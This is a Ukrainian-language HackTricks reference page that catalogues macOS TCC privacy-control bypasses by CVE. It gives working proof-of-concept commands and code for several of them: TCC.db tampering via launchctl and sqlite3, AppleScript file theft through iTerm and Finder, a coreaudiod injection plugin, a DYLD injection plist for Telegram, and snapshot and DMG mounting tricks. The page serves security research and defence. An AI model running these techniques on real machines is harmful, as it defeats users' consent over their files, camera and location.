# Пропуски TCC в macOS

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

## За функціональністю

### Пропуск запису

Це не пропуск, це просто те, як працює TCC: **Він не захищає від запису**. Якщо Термінал **не має доступу до читання Робочого столу користувача, він все ще може записувати в нього**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Розширений атрибут `com.apple.macl`** додається до нового **файлу**, щоб надати **додатку-створювачу** доступ до читання його.

### Обман користувача TCC

Можливо **покласти вікно над вікном запиту TCC**, щоб змусити користувача **прийняти** його, не помічаючи. Ви можете знайти PoC в [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Запит TCC за довільною назвою

Атакувальник може **створювати додатки з будь-якою назвою** (наприклад, Finder, Google Chrome...) у **`Info.plist`** і змушувати їх запитувати доступ до деякої захищеної TCC локації. Користувач подумає, що це легітимний додаток, який запитує цей доступ.\
Більше того, можливо **видалити легітимний додаток з Дока та поставити фейковий**, тому коли користувач клікає на фейковий (який може мати той самий іконка), він може викликати легітимний, запитати дозволи TCC та виконати шкідливе ПЗ, змушуючи користувача вважати, що легітимний додаток запитав доступ.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Додаткова інформація та PoC:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Bypass

За замовчуванням доступ через **SSH мав "Повний доступ до диска"**. Щоб вимкнути це, вам потрібно мати його перераховано, але вимкнено (видалення зі списку не забере ці привілеї):

![](<../../../../../.gitbook/assets/image (569).png>)

Тут ви можете знайти приклади того, як деякі **шкідливі програми змогли обійти цей захист**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Зверніть увагу, що тепер, щоб мати можливість увімкнути SSH, вам потрібен **Повний доступ до диска**
{% endhint %}

### Обробка розширень - CVE-2022-26767

Атрибут **`com.apple.macl`** надається файлам, щоб дати **певному додатку дозволи на читання**. Цей атрибут встановлюється, коли користувач **перетягує файл на додаток** або коли користувач **подвійно клацкає** на файл, щоб відкрити його за допомогою **типового додатка**.

Отже, користувач може **зареєструвати шкідливий додаток**, щоб обробляти всі розширення та викликати Служби запуску для **відкриття** будь-якого файлу (таким чином, шкідливому файлу буде надано доступ до читання).

### iCloud

За допомогою entitlement **`com.apple.private.icloud-account-access`** можливо спілкуватися з сервісом XPC **`com.apple.iCloudHelper`**, який **надасть токени iCloud**.

**iMovie** та **Garageband** мали цей entitlement та інші, які дозволяли.

Для отримання більш **інформації** про експлойт для **отримання токенів iCloud** з цього entitlement перегляньте виступ: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Додаток з дозволом **`kTCCServiceAppleEvents`** зможе **керувати іншими додатками**. Це означає, що він може **зловживати дозволами, наданими іншим додаткам**.

Для отримання додаткової інформації про Apple Scripts перегляньте:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Наприклад, якщо додаток має **дозвіл на Automation над `iTerm`**, наприклад у цьому прикладі **`Terminal`** має доступ до iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Над iTerm

Terminal, який не має FDA, може викликати iTerm, який має це, і використовувати його для виконання дій:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Над Finder

Або якщо додаток має доступ до Finder, він може виконати такий сценарій:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## За поведінкою додатку

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**Демон tccd** у користувацькому просторі використовує змінну **`HOME`** **env** для доступу до бази даних користувачів TCC з: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Згідно з [цим постом на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) і оскільки демон TCC працює через `launchd` в межах поточного домену користувача, можливо **контролювати всі змінні середовища**, які передаються йому.\
Отже, **зловмисник може встановити змінну середовища `$HOME`** в **`launchctl`** для вказівки на **контрольований каталог**, **перезапустити** демона **TCC**, а потім **безпосередньо змінити базу даних TCC**, щоб надати собі **всі доступні привілеї TCC** без будь-якого запиту до кінцевого користувача.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Примітки

Примітки мали доступ до захищених місць TCC, але коли створюється примітка, це **створюється в незахищеному місці**. Таким чином, ви могли б попросити примітки скопіювати захищений файл у примітку (тобто в незахищеному місці) і потім отримати доступ до файлу:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Транслокація

Бінарний файл `/usr/libexec/lsd` з бібліотекою `libsecurity_translocate` мав entitlement `com.apple.private.nullfs_allow`, що дозволяло створювати **nullfs** монтування, та entitlement `com.apple.private.tcc.allow` з **`kTCCServiceSystemPolicyAllFiles`** для доступу до кожного файлу.

Було можливо додати атрибут карантину до "Library", викликати службу XPC **`com.apple.security.translocation`**, і тоді б він відобразив би Library на **`$TMPDIR/AppTranslocation/d/d/Library`**, де всі документи всередині Library можна було **отримати доступ**.

### CVE-2023-38571 - Музика та ТБ <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Музика`** має цікаву функцію: коли вона працює, вона **імпортує** файли, що були перетягнуті до **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** у "медіатеку" користувача. Більше того, вона викликає щось на зразок: **`rename(a, b);`**, де `a` та `b` це:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Це **`rename(a, b);`** поведінка вразлива на **Race Condition**, оскільки можна помістити у папку `Automatically Add to Music.localized` фальшивий файл **TCC.db**, і тоді, коли створюється нова папка (b), скопіювати файл, видалити його, і спрямувати його до **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Якщо **`SQLITE_SQLLOG_DIR="шлях/папка"`**, це в основному означає, що **будь-яка відкрита db копіюється в цей шлях**. У цьому CVE цей контроль було зловживано для **запису** всередині **бази даних SQLite**, яка буде **відкрита процесом з FDA бази даних TCC**, а потім зловживати **`SQLITE_SQLLOG_DIR`** з **символічним посиланням у назві файлу**, так що коли ця база даних **відкривається**, користувач **TCC.db перезаписується** відкритою.

**Додаткова інформація** [**у викладці**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **та** [**у виступі**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Якщо змінна середовища **`SQLITE_AUTO_TRACE`** встановлена, бібліотека **`libsqlite3.dylib`** почне **логувати** всі SQL-запити. Багато додатків використовували цю бібліотеку, тому було можливо логувати всі їхні запити SQLite.

Декілька додатків Apple використовували цю бібліотеку для доступу до захищеної інформації TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Цей **змінний середовища використовується фреймворком `Metal`**, який є залежністю для різних програм, зокрема `Music`, яка має FDA.

Встановлюючи наступне: `MTL_DUMP_PIPELINES_TO_JSON_FILE="шлях/ім'я"`. Якщо `шлях` є дійсною директорією, помилка спрацює, і ми можемо використовувати `fs_usage`, щоб побачити, що відбувається в програмі:

* файл буде відкритий за допомогою `open()`, з назвою `шлях/.dat.nosyncXXXX.XXXXXX` (X - випадковий)
* одне або кілька `write()` записують вміст у файл (ми не контролюємо це)
* `шлях/.dat.nosyncXXXX.XXXXXX` буде перейменовано за допомогою `rename()` на `шлях/ім'я`

Це тимчасове записування файлу, за яким слідує **`rename(old, new)`**, **який не є безпечним.**

Це не є безпечним, оскільки потрібно **розрізняти старі та нові шляхи окремо**, що може зайняти певний час і бути вразливим на гонку. Для отримання додаткової інформації ви можете перевірити функцію `xnu` `renameat_internal()`.

{% hint style="danger" %}
Отже, якщо привілейований процес перейменовує з папки, якою ви керуєте, ви можете отримати RCE та змусити його отримати доступ до іншого файлу або, як у цьому CVE, відкрити файл, створений привілейованою програмою, і зберегти FD.

Якщо перейменування отримує доступ до папки, якою ви керуєте, поки ви змінили вихідний файл або маєте FD до нього, ви можете змінити файл призначення (або папку), щоб вказувати на символічне посилання, тож ви можете писати, коли завгодно.
{% endhint %}

Це було атакою в CVE: Наприклад, щоб перезаписати `TCC.db` користувача, ми можемо:

* створити `/Users/hacker/ourlink`, щоб вказувати на `/Users/hacker/Library/Application Support/com.apple.TCC/`
* створити директорію `/Users/hacker/tmp/`
* встановити `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* спровокувати помилку, запустивши `Music` з цим змінним середовища
* перехопити `open()` `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X - випадковий)
* тут ми також `open()` цей файл для запису та утримуємо дескриптор файлу
* атомарно змінюємо `/Users/hacker/tmp` на `/Users/hacker/ourlink` **в циклі**
* ми робимо це, щоб максимізувати наші шанси на успіх, оскільки вікно гонки досить вузьке, але втрата гонки має незначний недолік
* зачекайте трохи
* перевірте, чи ми маємо удачу
* якщо ні, запустіть знову з початку

Додаткова інформація за посиланням [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Тепер, якщо ви спробуєте використати змінну середовища `MTL_DUMP_PIPELINES_TO_JSON_FILE`, програми не запустяться
{% endhint %}

### Apple Remote Desktop

Як root ви можете увімкнути цю службу, і **агент ARD матиме повний доступ до диска**, який потім може бути зловживаний користувачем для копіювання нової **бази даних користувача TCC**.

## За допомогою **NFSHomeDirectory**

TCC використовує базу даних у домашній папці користувача для керування доступом до ресурсів, що специфічні для користувача, за адресою **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Отже, якщо користувач зможе перезапустити TCC з змінною середовища $HOME, що вказує на **іншу папку**, користувач може створити нову базу даних TCC в **/Library/Application Support/com.apple.TCC/TCC.db** та обманути TCC, щоб надати будь-які дозволи TCC будь-якій програмі.

{% hint style="success" %}
Зверніть увагу, що Apple використовує налаштування, збережені в профілі користувача в атрибуті **`NFSHomeDirectory`** для значення `$HOME`, тому якщо ви компрометуєте додаток з дозволами на зміну цього значення (**`kTCCServiceSystemPolicySysAdminFiles`**), ви можете **збройовиковувати** цю опцію з обхідом TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Перший POC** використовує [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) та [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) для зміни **HOME** папки користувача.

1. Отримати _csreq_ блоб для цільової програми.
2. Розмістити фальшивий файл _TCC.db_ з необхідним доступом та блобом _csreq_.
3. Експортувати запис служб каталогу користувача за допомогою [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Змінити запис служб каталогу для зміни домашньої папки користувача.
5. Імпортувати змінений запис служб каталогу за допомогою [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Зупинити _tccd_ користувача та перезавантажити процес.

Другий POC використовував **`/usr/libexec/configd`**, який мав `com.apple.private.tcc.allow` зі значенням `kTCCServiceSystemPolicySysAdminFiles`.\
Було можливо запустити **`configd`** з опцією **`-t`**, атакуючий міг вказати **власний пакет для завантаження**. Отже, експлойт **замінює** методи **`dsexport`** та **`dsimport`** зміни домашньої папки користувача на **ін'єкцію коду configd**.

Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## За допомогою ін'єкції процесів

Існують різні техніки для впровадження коду в процес та зловживання його привілеями TCC:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Більше того, найпоширеніша ін'єкція процесів для обходу TCC здійснюється через **плагіни (завантаження бібліотек)**.\
Плагіни - це додатковий код зазвичай у формі бібліотек або plist, який буде **завантажено основною програмою** та виконуватиметься в її контексті. Тому, якщо основна програма мала доступ до обмежених файлів TCC (через надані дозволи або entitlements), **власний код також його матиме**.

### CVE-2020-27937 - Directory Utility

Додаток `/System/Library/CoreServices/Applications/Directory Utility.app` мав entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, завантажував плагіни з розширенням **`.daplug`** та **не мав жорсткого** режиму виконання.

Для збройовиковування цього CVE, **`NFSHomeDirectory`** змінюється (зловживаючи попереднім entitlement) для можливості **захоплення бази даних TCC користувача** для обходу TCC.

Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
### CVE-2020-29621 - Coreaudiod

Бінарний файл **`/usr/sbin/coreaudiod`** мав entitlements `com.apple.security.cs.disable-library-validation` та `com.apple.private.tcc.manager`. Перший дозволяв **ін'єкцію коду**, а другий надавав доступ до **керування TCC**.

Цей бінарний файл дозволяв завантажувати **сторонні плагіни** з папки `/Library/Audio/Plug-Ins/HAL`. Тому було можливо **завантажити плагін та зловжити дозволами TCC** за допомогою цього PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Для отримання додаткової інформації перевірте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Плагіни рівня абстракції пристрою (DAL)

Системні додатки, які відкривають потік камери через Core Media I/O (додатки з **`kTCCServiceCamera`**), завантажують **у процес ці плагіни**, розташовані в `/Library/CoreMediaIO/Plug-Ins/DAL` (не обмежені SIP).

Просто зберігаючи там бібліотеку зі звичайним **конструктором**, можна впровадити код.

Декілька додатків Apple були вразливі до цього.

### Firefox

Додаток Firefox мав entitlements `com.apple.security.cs.disable-library-validation` та `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Для отримання додаткової інформації про те, як легко використовувати це [**перевірте оригінальний звіт**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Бінарний файл `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` мав entitlements **`com.apple.private.tcc.allow`** та **`com.apple.security.get-task-allow`**, що дозволяло впроваджувати код всередині процесу та використовувати привілеї TCC.

### CVE-2023-26818 - Telegram

У Telegram були entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** та **`com.apple.security.cs.disable-library-validation`**, тому було можливо зловживати цим, щоб **отримати доступ до його дозволів**, таких як запис з камери. Ви можете [**знайти навантаження в описі**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Зверніть увагу на те, як використовувати змінну середовища для завантаження бібліотеки, було створено **власний plist** для впровадження цієї бібліотеки, і **`launchctl`** був використаний для її запуску:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## За допомогою відкритих викликів

Можливо викликати **`open`** навіть під час роботи в пісочниці

### Сценарії терміналу

Досить поширено надавати терміналу **Повний доступ до диска (FDA)**, принаймні на комп'ютерах, які використовують технічні спеціалісти. І можливо викликати сценарії **`.terminal`** за допомогою цього.

Сценарії **`.terminal`** - це файли plist, такі як цей, з командою для виконання у ключі **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Додаток може написати термінальний скрипт у такому місці, як /tmp, і запустити його за допомогою команди:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Шляхом монтування

### CVE-2020-9771 - обхід TCC та підвищення привілеїв через mount\_apfs

**Будь-який користувач** (навіть непривілейований) може створити та змонтувати знімок часу та **отримати доступ до УСІХ файлів** цього знімка.\
**Єдине, що потрібно привілейоване**, це щоб застосунок, який використовується (наприклад, `Terminal`), мав доступ **Повного доступу до диска** (FDA) (`kTCCServiceSystemPolicyAllfiles`), який повинен бути наданий адміністратором.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Докладніше пояснення можна [**знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Монтування над файлом TCC

Навіть якщо файл бази даних TCC захищений, було можливо **монтувати над каталогом** новий файл TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Перевірте **повний експлойт** у [**оригінальному описі**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Інструмент **`/usr/sbin/asr`** дозволяв копіювати весь диск і монтувати його в іншому місці, обхід захисту TCC.

### Служби місцезнаходження

Є третя база даних TCC у **`/var/db/locationd/clients.plist`** для вказівки клієнтів, яким дозволено **доступ до служб місцезнаходження**.\
Папка **`/var/db/locationd/` не була захищена від монтування DMG**, тому було можливо монтувати власний plist.

## За допомогою програм автозапуску

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## За допомогою grep

У деяких випадках файли зберігають чутливу інформацію, таку як електронні адреси, номери телефонів, повідомлення... в незахищених місцях (що вважається уразливістю в Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Синтетичні кліки

Це вже не працює, але це [**працювало раніше**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ще один спосіб використання [**подій CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Посилання

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
